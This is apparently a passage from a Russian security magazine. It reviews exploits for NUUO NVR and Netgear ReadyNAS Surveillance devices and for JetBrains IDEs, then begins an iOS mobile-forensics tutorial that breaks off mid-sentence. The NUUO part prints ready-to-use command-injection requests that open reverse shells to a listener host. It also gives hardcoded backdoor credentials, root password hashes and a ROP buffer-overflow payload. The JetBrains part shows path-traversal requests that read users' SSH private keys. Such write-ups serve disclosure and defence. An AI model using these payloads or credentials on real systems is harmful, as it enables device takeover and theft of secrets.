Netgear ReadyNAS.
   Веб-интерфейс такой системы содержит ряд критических уязвимостей,
которые могут быть проэксплуатированы неавторизованным атакующим. Эти
уязвимости состоят из оставленных разработчиками бэкдоров-мониторов,
предположительно для использования инженерами NUUO. Проблемой стали
захардкоженные данные для авторизации, недостаточная проверка вводимых
данных и переполнение буфера, которое позволяет выполнить произвольный
код от имени root (в устройствах NUUO) и admin (для Netgear).
   Автором эксплоита были протестированы устройства NVRmini 2, NVRsolo,
Crystal и ReadyNAS Surveillance, но остальные продукты NUUO и другие сто-
ронние устройства (к примеру, NUUO Titan) тоже могут быть уязвимы.


EXPLOIT

Уязвимость 1.
Неправильная проверка вводимых данных приводит
к удаленному выполнению кода
Веб-интерфейс содержит скрытый файл с именем __debugging_center_
utils___.php, который неправильно проверяет параметр log и передает его
значение в функцию system().





Доступ к этому файлу может получить любой неавторизованный пользова-
тель. В итоге мы можем сделать следующее:
ReadyNAS   Surveillance.  Пример  открытия  бэк-шелла  на  адрес
192.168.1.204:9000 с правами admin:

GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3a
Socket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3a
INET(PeerAddr,"192.168.1.204%3a9000")%3bSTDIN->fdopen($c,r)%3b
$~->fdopen($c,w)%3bsystem$_+while<>%3b'

NVRmini 2 и NVRsolo. Пример открытия двух шеллов на адрес 192.168.1.204,
один на 9999-м порту, а другой — на 9998-м. Выполнение команд идет на 9999-
м порту, а вывод получает 9998-й порт. Команды выполняются с правами root:

GET /__debugging_center_utils___.php?log=something%3btelnet+192.168
.1.204+9999+|+bash+|+telnet+192.168.1.204+9998

Уязвимость 2.
Неправильная проверка вводимых данных приводит
к удаленному выполнению кода
Скрипт handle_daylightsaving.php недостаточно надежно проверяет пара-
метр NTPServer и передает его значение в функцию system().





Для доступа к этому файлу уже нужна учетная запись авторизованного поль-
зователя с правами администратора.
ReadyNAS Surveillance. Создаем файл /tmp/test с выводом команды
whoami:

GET /handle_daylightsaving.php?act=update&NTPServer=bla%3b
+whoami+>+/tmp/test

NVRmini 2 и NVRsolo. Открываем шелл с правами root:

GET /handle_daylightsaving.php?act=update&NTPServer=bla%3brm+/tmp/
f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.1.204
+9000+>/tmp/f

Crystal. Можем открыть шелл с правами root:

GET /handle_daylightsaving.php?act=update&NTPServer=bla%3bbash+-i
+>%26+/dev/tcp/192.168.1.204/4444+0>%26

Уязвимость 3.
Сброс пароля администратора

В старых версиях прошивок и приложения ReadyNAS Surveillance неавторизо-
ванные пользователи могли обратиться к файлу cgi_system из веб-интерфей-
са. Этот файл позволяет выполнять несколько интересных системных команд,
таких как загрузка настроек по умолчанию. Это позволяет сбросить пароль ад-
министратора. Похоже, что версии 2.2.1 и 3.0.0 прошивок NVRmini 2 и NVRsolo
уже не уязвимы, хотя ReadyNAS Surveillance по-прежнему содержит уязвимость:

GET /cgi-bin/cgi_system?cmd=loaddefconfig

Уязвимость 4.
Раскрытие информации
В веб-интерфейсе есть скрытый файл __nvr_status___.php с захардкоженны-
ми логином и паролем, которые позволяют просмотреть список текущих про-
цессов, информацию о доступной памяти и статус файловой системы. Эта ин-
формация может быть получена неавторизованным пользователем с помощью
следующего запроса:

POST /__nvr_status___.php HTTP/1.1
username=nuuoeng&password=qwe23622260&submit=Submit

Уязвимость 5.
Захардкоженный пароль администратора

NVRmini 2 и NVRsolo содержат два захардкоженных пароля для пользователя
root (один закомментирован). У авторов эксплоита не получилось их подобрать,
но они есть во всех устройствах NVRmini 2 и NVRsolo.
NVRmini 2

#root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::

NVRsolo

#root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
root:$1$72ZFYrXC$aDYHvkWBGcRRgCrpSCpiw1:0:0:99999:7:::

Уязвимость 6.
Инъекция команд в transfer_license

У этой уязвимости есть ограничение: для удаленной атаки требуется аккаунт
администратора, а для локальной — права авторизованного пользователя.
  В команду transfer_license можно внедрить свою команду через пара-
метр sn:

cgi_main?cmd=transfer_license&method=offline&sn=";<command>;#

Эти данные будут переданы напрямую в C-функцию system() в исполняемом
файле cgi_main (дальше мы подробнее рассмотрим этот фрагмент кода).
NVRmini 2. Можно открыть шелл на порту 4444:

GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn="%3b
nc+-l+-p+4444+-e+/bin/sh+%26+%23

В Netgear Surveillance нет netcat, но можно получить OpenSSL реверс-шелл
по адресу 192.168.133.204:4444:

GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn="%3b
mkfifo+/tmp/s%3b+/bin/bash+-i+<+/tmp/s+2>%261+|+openssl+s_client
+-quiet+-connect+192.168.133.204%3a4444+>+/tmp/s%3b+rm+/tmp/s%3b%23

Эту уязвимость может использовать любой авторизованный пользователь
для повышения своих прав до root или admin с помощью следующей команды:

CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline
   &sn=<PAYLOAD>'

Исполняемый файл cgi_main находится в /apps/surveillance/bin/cgi_
main на устройстве ReadyNAS. В NVRmini 2 это /NUUO/bin/cgi_main.

Уязвимость 7.
Переполнение буфера в команде transfer_license
Здесь те же ограничения, что и у предыдущей уязвимости. Для удаленной атаки
нужен аккаунт администратора, для локальной — авторизованного пользователя.
   Параметр sn из метода transfer_license подвержен не только уязвимо-
сти типа инъекции команд, но и переполнению буфера.
   Функция 0x20BC9C (NVRmini 2 firmware v3.0.0):





Как видишь, значение этого параметра копируется напрямую в строку с фик-
сированной длиной из 128 символов.
  Выполняем следующий запрос:

GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=aaaa...aa

И получаем падение со следующей информацией:





Отправлять запрос можно при помощи как GET, так и POST.
  По значениям регистров уже видно, что мы можем контролировать часть
из них.
  В таблице ниже приведена информация о наличии техник по противостоя-
нию эксплоитам в прошивках разных устройств:





Еще одно ограничение — не должно быть нулевых байтов.
  Ниже представлен пример эксплоита для NVRmini 2 (версия прошивки
3.0.0), который открывает шелл на порту 4444, используя несколько гаджетов
ROP для обхода NX. Эти гаджеты взяты из libc-2.15.so, которая в прошивки
версии 3.0.0 всегда грузится по адресу 4066c000:

0x00018ba0 : pop {r3, lr} ; bx lr -> находится в 40684BA0 (первый
гаджет, устанавливает r3 для следующего гаджета)
0x000f17cc : mov r0, sp ; blx r3 -> находится в 4075D7CC (второй
гаджет, устанавливает аргументы для system)
0x00039ffc : system() -> находится по адресу 406A5FFC (берет значения
из r0, указывающие на sp, и выполняет их)
Payload (in the stack) -> %6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20
%2d%65%20%2f%62%69%6e%2f%73%68%20%26 ("nc -l -p 4444 -e /bin/sh &")

Пример запроса:

sn=aaaaaaaaaaaaaaaaaaa...aaaaa%a0%4b%68%40aaaaaaaaaaaa%fc%5f%6a%40
%cc%d7%75%40%6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f
%62%69%6e%2f%73%68%20%26

Остальные прошивки будут иметь другие гаджеты.
Локально эту уязвимость можно использовать так:

CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline
   &sn=<PAYLOAD>'

Оригинальный технический отчет с более подробной информацией об уязви-
мости типа «переполнение буфера» приведен (txt) в блоге автора.

TARGETS
• NUUO NVRmini 2, прошивки от 1.7.5 до 3.0.0 (старые версии прошивок тоже
   могут быть уязвимы);
• NUUO NVRsolo, прошивки версий 1.0.0—3.0.0;
•  ReadyNAS Surveillance, прошивки 1.1.1—1.4.1 (уязвимы и x86-, и ARM-вер-
   сии, старые версии прошивок тоже могут быть уязвимы);
•  остальные продукты NUUO, которые используют такой же веб-интерфейс,
   тоже могут быть уязвимы.

SOLUTION
Об исправлениях на момент написания статьи не было известно. Разработчики
так и не ответили исследователям в течение примерно полугода.



УДАЛЕННОЕ ВЫПОЛНЕНИЕ КОДА И РАСКРЫТИЕ ФАЙЛОВ
В JETBRAINS IDE

 CVSSv2      Нет
 Дата релиза: 15 августа 2016 года
 Автор:       Джордан Милн (Jordan Milne)
 CVE:          нет

С 2013 года по май 2016-го в средах разработки компании JetBrains су-
ществовала уязвимость типа «раскрытие локальных файлов», а в версиях
для Windows и OS X было возможно еще и удаленное выполнение кода. Уяз-
вимости подвержены PyCharm, Android Studio, WebStorm, IntelliJ IDEA и еще
несколько продуктов. Единственным условием для атаки было посещение
жертвой веб-страницы, которую контролирует атакующий, при открытой уяз-
вимой IDE.
   Источник проблем — веб-сервер WebStorm, который с 2013 года стал по-
ставляться вместе с IDE JetBrains. Атаки оказались возможными из-за того,
что он был все время активен, а cross-origin resource sharing допускал любые
источники.
   Выполнение произвольного кода на Windows и OS X стало возможным
для всех IDE начиная с версий, вышедших 13 июля 2015 года. Но есть вероят-
ность, что уязвимые IDE встречались и раньше.
   Изначально автор эксплоита Джордан Милн исследовал межпротоколь-
ные коммуникации в поисках интересных целей. Он начал с изучения серви-
сов, которые были запущены на его собственной машине. Запустив lsof -P
-ITCP | grep LISTEN, он увидел список программ, которые слушают локаль-
ные TCP-порты.

$ lsof -P -iTCP | grep LISTEN
# ...
pycharm   4177 user  289u  IPv4 0x81a02fb90b4eef47      0t0  TCP
localhost:63342 (LISTEN)

В качестве основной IDE Милн использовал PyCharm, но никогда не знал, что
эта программа биндит порт. Чтобы узнать подробности, исследователь на-
травил на этот порт Nmap:

$ nmap -A -p 63342 127.0.0.1
# [...]
PORT      STATE SERVICE VERSION
63342/tcp open  unknown
1 service unrecognized despite returning data. If you know the
service/version, please submit the following fingerprint at
http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port63342-TCP:V=6.46%I=7%D=8/2%Time=57A0DD64%P=x86_64-apple-
darwin13.1.
SF:0%r(GetRequest,173,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
content-type:\x
# [...]

На вид — обычный сервер HTTP. Для локального приложения это странно.
Смотрим заголовки CORS.

$ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/"
> GET / HTTP/1.1
> Host: 127.0.0.1:63342
> User-Agent: curl/7.43.0
> Accept: */*
> Origin: http://attacker.com/
>
< HTTP/1.1 404 Not Found
[...]
< access-control-allow-origin: http://attacker.com/
< vary: origin
< access-control-allow-credentials: true
< access-control-allow-headers: authorization
< access-control-allow-headers: origin
< access-control-allow-headers: content-type
< access-control-allow-headers: accept
<
* Connection #0 to host 127.0.0.1 left intact
<!doctype html><title>404 Not Found</title><h1 style="text-align:
center">404 Not Found</h1><hr/><p style="text-align: center">
PyCharm 5.0.4</p>

Получается, что в HTTP-сервере PyCharm любым веб-страницам (например,
http://attacker.com) разрешается отправлять авторизованные запросы и чи-
тать ответ.
   Поискав в интернете материалы, которые бы объяснили предназначе-
ние этого порта, Милн узнал, что в начале 2013 года в IDE добавили сервер
WebStorm. Идея была в том, чтобы не поднимать свой веб-сервер для про-
смотра результатов разработки в браузере. Стало достаточно кликнуть
на кнопку View  in  browser внутри WebStorm, чтобы она открыла браузер
по   адресу   http://localhost:63342/<projectname>/<your_file.html>.
Остальные скрипты на странице подключаются по тому же адресу. К примеру,
http://localhost:63342/<projectname>/some_script.js.
   Осталось  проверить,  что  в  PyCharm  встроен  тот же  сервер,  что
и в WebStorm. Для этого Милн в PyCharm создал проект testing, поместил
файл something.txt в его корневую директорию и попробовал скачать его
из командной строки.

$ curl -v -H "Origin: http://attacker.com/" "http://127.0.0.1:63342/
testing/something.txt"
> GET /testing/something.txt HTTP/1.1
> Host: 127.0.0.1:63342
> User-Agent: curl/7.43.0
> Accept: */*
> Origin: http://attacker.com/
>
< HTTP/1.1 200 OK
[...]
< access-control-allow-origin: http://attacker.com/
[...]
these are the file contents!

Выходит, что любой сайт может читать любые файлы проекта, если знает нуж-
ное имя проекта и имя файла. Очевидно, что многие проекты включают кон-
фигурационные файлы с важными данными (например, с ключами от AWS).
Ниже представлен фрагмент JavaScript из страницы на attacker.com. Он,
по сути, делает примерно то же, что и curl в примере выше.





Получить доступ к интересным файлам уже неплохо, но этот эксплоит можно
развить до более боевого.

EXPLOIT
Посмотрим, нельзя ли читать файлы вне директории проекта. К примеру, атаку-
ющему могут быть интересны ключи SSH и подобные вещи — они обычно нахо-
дятся в стандартных местах. Но для начала попробуем подняться на несколько
каталогов выше.

$ curl -v "http://localhost:63342/testing/../../../.ssh/id_rsa"
* Rebuilt URL to: http://localhost:63342/.ssh/id_rsa

По спецификации фрагменты с точками должны быть нормализованы на кли-
енте или на сервере, то есть вместо /../ должно быть %2F..%2F. Но нам по-
везло: PyCharm правильно понимает URL-кодированные символы и приводит
их к изначальному виду.

$ curl -v "http://localhost:63342/testing/..%2f..%2f.ssh/id_rsa"
> GET /testing/..%2f..%2f.ssh/id_rsa HTTP/1.1
[...]
>
< HTTP/1.1 200 OK
< content-type: application/octet-stream
< server: PyCharm 5.0.4
[...]
<
ssh-rsa AAAAB3NzaC[...]

Успех! Единственное ограничение — мы должны  знать,  как называет-
ся проект жертвы,  так  как, если обратиться по неправильному адресу
(/invalidproject/<anything>), веб-сервер всегда будет возвращать ошиб-
ку 404.
   Если название неизвестно, то можно попробовать использовать словарь
с часто встречающимися названиями и запрашивать файл с метаданными
workspace.xml, который JetBrains автоматически добавляет в большинство
проектов.

$ curl --head "http://localhost:63342/testing/.idea/workspace.xml"
HTTP/1.1 200 OK
$ curl --head "http://localhost:63342/somethingelse/.idea/
   workspace.xml"
HTTP/1.1 404 Not Found

Получив ответ 200, мы убеждаемся, что проект существует.
Финальный эксплоит выглядит следующим образом:





У этого способа нет ограничений, и автор эксплоита с его помощью переби-
рал по 2000 названий проектов в секунду.




                           Продолжение статьи
ВЗЛОМ
ОБЗОР
ЭКСПЛОИТОВ
   АНАЛИЗ НОВЫХ УЯЗВИМОСТЕЙ

    Начало статьи


    В сегодняшнем обзоре мы пройдемся по многочисленным
   уязвимостям в продуктах компании NUUO, которая занимается
разработкой систем для камер наблюдения. Помимо этого, разберем
   несколько уязвимостей, которым были подвержены популярные
    среды разработки компании JetBrains (PyCharm, IntelliJ IDEA,
WebStorm и другие): удаленное выполнение кода и раскрытие файлов.



Обходимся без перебора названия проекта
Чтобы не перебирать названия, Милн стал искать доступные  API, кото-
рые предоставляет веб-сервер PyCharm. И в итоге нашел точку входа вида /
api/internal,  которая  соответствует  JetBrainsProtocolHandlerHttpSer
vice. Она позволяет передавать данные в JSON, содержащие URL со схе-
мой jetbrains:. Затем IDE что-то с ними делает. Автор эксплоита пишет, что
не смог найти документации по этим URL, так что пришлось изучать самостоя-
тельно.
  Многообещающе,  в  частности,  выглядит  обработчик  jetbrains://
<project_name>/open/<path>.





Этот код позволяет открыть проект по абсолютному пути. К примеру, директо-
рия /etc есть в большинстве *nix-подобных систем. Попытаемся открыть ее:

$ curl "http://127.0.0.1:63342/api/internal" --data '{"url":
   "jetbrains://whatever/open//etc"}'

И получаем ошибку.





                    Ошибка при открытии директории /etc

Открыть можно только директорию со структурой проекта JetBrains. К сча-
стью, PyCharm 2016.1 и выше идет с такой структурой, причем в систем-
ном каталоге. В OS X это выглядит следующим образом: /Applications/
PyCharm.app/Contents/helpers. Попробуем открыть:

$ curl -v "http://127.0.0.1:63342/api/internal" --data '{"url":
   "jetbrains://whatever/open//Applications/PyCharm.app/Contents/
   helpers"}'





                                                 Открытие директории helpers

Получилось! Теперь нам даже не требуется искать точное имя проекта, так
как мы знаем проект, который всегда есть. В Linux стандартной директории
для PyCharm может не быть, так как многие скачивают дистрибутив в виде ар-
хива tar и распаковывают куда бог на душу положит. Однако путь можно опре-
делить, выполнив запрос /api/about?more=true и найдя ключ homePath.





Теперь у нас есть открытый проект helpers, мы определили домашнюю ди-
ректорию с помощью ответа от /api/about?more=true и можем составить
запрос для получения пользовательских ключей SSH. Путь будет примерно
следующим:   /helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/<user>/.
ssh/id_rsa.

$ curl -v "http://localhost:63342/helpers/..%2f..%2f..%2f..%2f..
   %2f..%2fhome/user/.ssh/id_rsa"
> GET /helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/user/.ssh/id_rsa
HTTP/1.1
[...]
>
< HTTP/1.1 200 OK
< content-type: application/octet-stream
< server: PyCharm 5.0.4
[...]
<
ssh-rsa AAAAB3NzaC[...]

Эксплуатация в Windows
Трюк с helpers, описанный выше, работает, только если у пользовате-
ля есть PyCharm 2016.1. Но как быть с другими IDE? Вернемся к обработчику
jetbrains://project/open и проверим, какие еще пути он может открывать.
Выбор Милна пал на пути UNC. Это специальные пути Windows, которые по-
зволяют указать на файлы, доступные по сети по адресам вида \\servername\
sharename\filepath. Множество Windows API для работы с файлами (и Java
API, которые выступают обертками к ним) понимают такие пути и могут получать
доступ к ресурсам, расшаренным на других машинах по SMB. В результате чи-
тать и записывать такие файлы можно точно так же, как и на локальной машине.
Если мы сможем заставить IDE открыть проект из нашей шары, то нам не при-
дется гадать, как называется проект на машине жертвы.
  В качестве теста автор поднял шару Samba с именем anontesting без ав-
торизации, которая содержала проект JetBrains, а затем попытался открыть ее:

$ curl -v "http://127.0.0.1:63342/api/internal" --data '{"url":
   "jetbrains://whatever/open/\\\\smb.example.com\\anonshare\\
   testing"}'

Провайдер со стороны атакуемой машины не заблокировал исходящий тра-
фик. Это позволяет загрузить произвольный проект с подконтрольного нам
удаленного ресурса. Однако такое поведение позволяет не только читать
произвольные файлы в системе.
  Каждый проект в JetBrains IDE имеет возможность установить задачи после
запуска. К примеру, в PyCharm это Python-скрипт, а в Android Studio и IntelliJ
IDEA — файл jar. Они будут автоматически срабатывать после загрузки проек-
та. Добавим в корневой каталог «атакующего» проекта скрипт hax.py.





          Установка скрипта hax.py, который стартует после загрузки проекта в PyCharm





                                                     Настройки скрипта hax.py

Скрипт будет содержать всего две строчки :).



Загрузим проект на наш сервер с Samba и сделаем страницу со следующим
содержимым:





После того как жертва зайдет на наш сайт, у нее появится...





                   Успешное срабатывание эксплоита для JetBrains IDE в ОС Windows


Тот же трюк в OS X
OS X автоматически монтирует удаленные файловые системы NFS, когда об-
ращаешься к ним через /net. Это значит, что мы можем применить механизм,
похожий на тот, что использовали в Windows. Создаем анонимный сервер NFS,
кладем туда проект и открываем /net/<hostname>/<sharename>/<projectna
me>. Проверяем:

$ curl -v "http://127.0.0.1:63342/api/internal" --data '{"url":
   "jetbrains://whatever/open//net/nfs.example.com/anonshare/
   testing"}'

Вот готовый скрипт для страницы:





                         Успешное срабатывание эксплоита для JetBrains IDE в OS X

Я опустил подробности общения с разработчиком по поводу устранения уяз-
вимости, но ты можешь прочитать их в оригинальной статье в блоге Милна.

TARGETS
Среды, основанные на JetBrains версий с начала 2013 года по май 2016 года
(PyCharm, Android Studio, WebStorm, IntelliJ IDEA и другие).

SOLUTION
Есть исправление от производителя за 11 мая 2016 года.
ВЗЛОМ





    Олег Скулкин
     skulkin@inbox.ru


МОБИЛЬНАЯ
КРИМИНАЛИСТИКА
ИЗВЛЕКАЕМ ДАННЫЕ ИЗ IOS-УСТРОЙСТВ
И ПРОВОДИМ ИХ АНАЛИЗ



Мобильный девайс, будь то смартфон или планшет, может
рассказать о своем хозяине гораздо больше, чем его дру-
зья, родные и близкие. Именно поэтому зачастую рассле-
дование правонарушения начинается с изучения данных,
хранящихся на этих устройствах. Ты когда-нибудь заду-
мывался о том, какую информацию могут извлечь право-
охранительные органы, если к ним в руки попадет «яблоч-
ный» девайс? Нет? Ну тогда я тебе расскажу, а заодно
и покажу, как это делается.

ЧТО ЕЩЕ ЗА МОБИЛЬНАЯ КРИМИНАЛИСТИКА?
Еще совсем недавно мы бы могли говорить лишь о компьютерной криминали-
стике и компьютерных преступлениях, но технологический прогресс прекрас-
но знает свое дело: с выходом и широким распространением смартфонов
и планшетных устройств появилось и новое направление — мобильная крими-
налистика, которая в совокупности с компьютерной и сетевой стала называть-
ся цифровой криминалистикой. Разумеется, впоследствии и она отрастила
свои ветви. Так, разделяют криминалистическое исследование Android, iOS,
BlackBerry и некоторых других мобильных операционных систем. О кримина-
листическом исследовании i-девайсов мы с тобой сегодня и поговорим.
   Все i-девайсы (iPhone, iPad и iPod Touch) работают под управлением опе-
рационной системы iOS. До третьей версии она называлась iPhone OS и была
разработана специально для этого устройства. В ее основе лежит архитектура
ее старшего брата — Mac OS X, что, разумеется, сказалось и на используемой
ею файловой системе.

ФАЙЛОВАЯ СИСТЕМА I-ДЕВАЙСА
Во всех i-девайсах используется файловая система HFSX — полная копия
HFS+ с той лишь разницей, что первая позволяет работать в режиме с учетом
регистра имен. Очень часто в цифровой криминалистике используется так на-
зываемый файловый карвинг — метод восстановления данных, основанный
на анализе не метаданных, а содержимого файлов. Так, карверы, например
всем известный (и довольно популярный в кругах криминалистов) Scalpel, вос-
станавливают файлы, опираясь на заголовки и расширения. Так называемый
семантический карвинг берет за основу внутреннюю структуру файлов, что по-
зволяет восстанавливать даже фрагментированные файлы. Именно этим спо-
собом криминалисты и восстанавливают данные из HFS и HFS+. Это касается
OS X. А что же с iOS? Сейчас расскажу.
   Все.  Очень.  Плохо.  Apple  использует  технологию, именуемую  Data
Protection, чтобы защитить данные, хранимые в памяти устройства. При соз-
дании нового файла генерируется уникальный 256-битный ключ (File Key), он
шифруется так называемым Class Key и хранится в метаданных файла, а те,
в свою очередь, шифруются ключом файловой системы (EMF Key), который
генерируется на основе UID устройства. Что это значит? Все просто: приме-
нение классического файлового карвинга не даст никаких результатов, так
как все данные в свободной области файловой системы будут зашифрованы.
Правда, некоторые исследователи утверждают, что сравнительным анализом
файла каталога и журнального файла можно получить информацию об удален-
ных файлах, включая расположение их метаданных, временные метки и про-
чее. Таким образом можно восстановить удаленные файлы, найти их ключи
и расшифровать их. Но это все теория. А ты наверняка знаешь, что в теории
нет разницы между теорией и практикой, а на практике — она есть.

ИДЕНТИФИКАЦИЯ I-ДЕВАЙСА
Так как на данный момент i-девайсов выпущено великое множество, одной
из первоочередных задач оказывается начальная идентификация того или
иного устройства. Для этого есть прекрасный инструмент — libimobiledevice.
Libimobiledevice — это кросс-платформенная библиотека и набор инструмен-
тов, предназначенный для коммуникации с различными i-девайсами, включая
iPhone, iPod Touch, iPad и Apple TV, по понятным им протоколам. С помощью
libimobiledevice исследователь может получить доступ к файловой системе
i-девайса, собрать информацию об устройстве, сделать резервную копию или
восстановить из нее, управлять иконками на SpringBoard, инсталлированными
приложениями и так далее. Данная библиотека находится в разработке с 2007
года, и главная ее цель — предложить инструмент для работы с i-девайсами
в среде Linux.
   Итак, libimobiledevice можно использовать для сбора информации. Для это-
го воспользуемся утилитой ideviceinfo. Если к компьютеру подключено только
одно устройство, достаточно просто запустить утилиту из терминала:

# ideviceinfo -s
BluetoothAddress: 70:11:24:33:fa:4a
DeviceClass: iPad
DeviceName: Oleg's iPad
EthernetAddress: 70:11:24:33:fa:4b
ProductName: iPhone OS
ProductType: iPad2,5
ProductVersion: 9.3.3
SerialNumber: F4KK3N4YF195
TimeZone: Europe/Moscow
UniqueDeviceID: d2c4466bbda5fc2cc87384dd9b64c054815c9cbb
WiFiAddress: 70:11:24:33:fa:49

Я намеренно не представил весь вывод — только данные, наиболее значи-
мые с точки зрения мобильной криминалистики. «Зачем мне вообще вся эта
информация нужна? Ведь я могу и по внешнему виду устройство идентифи-
цировать!» — скажешь ты. И будешь не прав. Если ты еще не забыл, здесь мы
говорим о цифровой криминалистике в целом и о мобильной криминалисти-
ке в частности, а значит, любое такое исследование может угодить прямиком
в суд, а это, в свою очередь, означает, что идентификационные особенности
того или иного i-девайса ты должен скрупулезно собрать и задокументировать.

ИЗВЛЕЧЕНИЕ ДАННЫХ ИЗ I-ДЕВАЙСА
Теперь мы знаем, что за устройство мы исследуем: iPad 2,5, или iPad mini пер-
вого поколения. Пришло время извлечь данные из него. В мобильной крими-
налистике для извлечения данных из iOS-устройств используется три основ-
ных метода:
•  Извлечение данных на физическом уровне. Это самый оптимальный спо-
   соб, который позволяет криминалисту получить наибольшее количество
   данных, в том числе удаленных. Чаще всего такой способ подразумевает
   джейлбрейк i-девайса.
•  Извлечение данных на уровне файловой системы. Это второй по значимо-
   сти способ: при его использовании криминалист извлекает все данные,
   видимые на уровне файловой системы. При этом восстановить удаленные
   файлы невозможно. Исключение составляют удаленные записи из баз дан-
   ных SQLite, а также миниатюры удаленных пользователем изображений.
•  Извлечение данных на логическом уровне. Этот метод позволяет извлечь
   часть файловой системы, что достигается резервным копированием. К со-
   жалению, с его помощью нельзя получить такую важную с точки зрения кри-
   миналистики информацию, как электронная почта, базы с геолокационны-
  ми данными (при этом подобные данные можно извлечь из изображений
   благодаря EXIF) или кеш приложений.

Извлечение данных на логическом уровне наиболее популярно, так как далеко
не всегда находится возможность сделать джейлбрейк i-девайсов, чтобы из-
влечь данные на физическом уровне. И хотя недавно был представлен способ
джейлбрейка устройств вплоть до версии 9.3.3, но выход iOS 9.3.4 закрыл эту
возможность для криминалистического программного обеспечения, а с ним
и для криминалистов. Хорошо, что под рукой у меня оказался мой старенький
iPhone 4, который позволит продемонстрировать извлечение данных на физи-
ческом уровне.

ИЗВЛЕЧЕНИЕ НА ЛОГИЧЕСКОМ УРОВНЕ
Так как извлечение данных на логическом уровне — наиболее простой и в то же
время наиболее распространенный способ (к тому же единственно возмож-
ный для нашего первого подопытного), начну я именно с него. А воспользуем-
ся мы все той же libimobiledevice. Для создания резервных копий (а именно это
позволяет криминалистам извлекать данные на логическом уровне) в нашем
распоряжении имеются две утилиты: idevicebackup и idevicebackup2. Если ис-
следуемое устройство работает под управлением iOS младше четвертой вер-
сии, следует использовать idevicebackup, если старше — idevicebackup2. Вер-
нись к информации об устройстве, и ты увидишь, что на нашем девайсе iOS
9.3.3. Это явно больше четырех, поэтому idevicebackup2 — наш вариант.
   Синтаксис очень прост: достаточно напечатать в терминале название ути-
литы (idevicebackup2), backup в качестве аргумента, а после указать директо-
рию, в которую данные и будут извлечены. Как только ты нажмешь заветный
Enter, процесс запустится:

# idevicebackup2 backup ~/Desktop/ForensicsBackup





            Рис. 1. Извлечение данных на логическом уровне с помощью idevicebackup


В результате мы получили типичную для резервных копий i-девайсов директо-
рию, название которой — UDID устройства, в нашем случае d2c4466bbda5fc2
cc87384dd9b64c054815c9cbb.
   Если ты откроешь эту директорию, то увидишь четыре стандартных файла
и массу файлов с именами длиной в 40 символов (см. рис. 2).





                                                    Рис. 2. Извлеченные данные

Начнем с четырех стандартных файлов:
•  Status.plist — содержит сведения о том, удачно ли прошло резервное
   копирование.
•  Manifest.plist — описывает содержимое директории. Например, в нем
   ты найдешь список приложений, включая их версии, дату и время производ-
   ства резервной копии, ее тип (шифрованная или нет), а также некоторую
  информацию об i-девайсе.
•  Manifest.mbdb — хранит описание всех файлов, входящих в состав резерв-
   ной копии. Каждая запись содержит следующие параметры:
     •  Domain: указывает, к какому домену относится элемент
     •   Path: содержит полный путь к элементу
     •   Link Target: указывает точку назначения элемента, если последний яв-
     ляется символьной ссылкой
     •  User ID и Group ID: указывает принадлежность к пользователю и группе
     •  m. time: дата последней модификации файла (временная метка в фор-
    мате Unix Epoch)
     •   a. time: дата последнего доступа к элементу
     •   c. time: дата последнего изменения файла или директории
     •   File size: размер файла в байтах
     •   Unix file permissions: права доступа к файлу
     •   File hash: хеш файла
•  Info.plist — содержит информацию об устройстве, включая дату произ-
   водства резервной копии, номер телефона, имя устройства, ICCID, IMEI,
   версию iOS, серийные номера.

Что до всех остальных файлов — они и составляют непосредственно резервную
копию. Почему у них такие странные имена? Все очень просто: эти 40 симво-
лов — хеш-сумма SHA-1, подсчитанная от полного пути к файлу, включая домен
и субдомен. Что же это за домены такие? Рассказываю. Каждый файл, входя-
щий в состав резервной копии, относится к одному из следующих доменов:
•  App domain — содержит данные, относящиеся к инсталлированным прило-
   жениям;
•  Camera Roll domain — содержит данные, полученные посредством камеры
   устройства, например фотографии, видеозаписи, а также миниатюры изо-
   бражений;
• Home domain — содержит данные приложений, инсталлированных в iOS
   по умолчанию;
•  Keychain domain — содержит зашифрованные данные, относящиеся к так
   называемой связке ключей;
•  Media domain — включает все мультимедиаэлементы, которые не относятся
   к камере устройства, например изображения из MMS-сообщений или голо-
   совые сообщения;
•  Mobile Device domain — содержит профили, включающие в себя сертифика-
   ты, информацию об устройстве и программном обеспечении;
•  Root domain — содержит кешированные данные геолокационных сервисов
   устройства;
•  System Preferences domain — содержит конфигурационные файлы базовых
   компонентов iOS;
•  Wireless domain — содержит данные о тех компонентах, что делают i-девайс
  еще и мобильным телефоном.

ФИЗИЧЕСКОЕ ИЗВЛЕЧЕНИЕ
Итак, с логическим извлечением разобрались, перейдем к физическому. Как я
уже упоминал, у меня под рукой оказался старенький iPhone 4, который и полу-
чит свои пятнадцать минут славы.
   Для физического извлечения я воспользуюсь тяжелой артиллерией — моим
любимым iOS Forensic Toolkit от компании Elcomsoft. Данный набор инстру-
ментов доступен как для Windows, так и для OS X и представляет собой набор
утилит, с помощью которого можно произвести любой тип извлечения данных,
а также еще некоторые весьма полезные манипуляции, например подобрать
или обойти пасскод. Я воспользуюсь своей любимой версией — для OS X.
   Перед тем как начать извлечение данных, поговорим немного о структуре
разделов iOS-устройств. Итак, NAND i-девайсов разделен на две части: си-
стемный раздел и раздел с данными. Первый расположен в /dev/disk0s1 или
/dev/disk0s1s1. Так как в системный раздел пользовательские данные не за-
писываются, он сравнительно небольшой — 1–2 Гбайт, в зависимости от раз-
мера памяти устройства. Примечательно, что к этому разделу не применяется
шифрование, правда и криминалистически значимой информации он не со-
